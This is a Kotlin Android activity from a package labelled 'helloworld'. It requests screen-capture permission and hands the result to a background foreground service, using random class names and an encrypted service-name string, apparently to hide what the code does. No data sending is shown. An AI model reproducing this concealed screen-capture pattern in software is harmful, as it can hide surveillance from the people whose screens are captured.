package com.xiaohao.helloworld

import android.app.Activity
import android.content.Intent
import android.media.projection.MediaProjectionManager
import android.os.Build
import android.os.Bundle
import android.util.Log

class XerQvgpGBzr8FDFr: Activity() {

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
 
        when (intent.action) {
            ACT_REQUEST_MEDIA_PROJECTION -> {
                val mediaProjectionManager =
                    getSystemService(p50.a(byteArrayOf(29, 22, 127, -73, -85, -66, -112, 19, 31, 25, 126, -67, -66, -120, -113, 15), byteArrayOf(112, 115, 27, -34, -54, -31, -32, 97))) as MediaProjectionManager
                val intent = mediaProjectionManager.createScreenCaptureIntent()
                startActivityForResult(intent, REQ_REQUEST_MEDIA_PROJECTION)
            }
            else -> finish()
        }
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        if (requestCode == REQ_REQUEST_MEDIA_PROJECTION) {
            if (resultCode == RESULT_OK && data != null) {
                launchService(data)
            } else {
                setResult(RES_FAILED)
            }
        }

        finish()
    }

    private fun launchService(mediaProjectionResultIntent: Intent) {
 
        val serviceIntent = Intent(this, DFm8Y8iMScvB2YDw::class.java)
        serviceIntent.action = ACT_INIT_MEDIA_PROJECTION_AND_SERVICE
        serviceIntent.putExtra(EXT_MEDIA_PROJECTION_RES_INTENT, mediaProjectionResultIntent)

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(serviceIntent)
        } else {
            startService(serviceIntent)
        }
    }

}
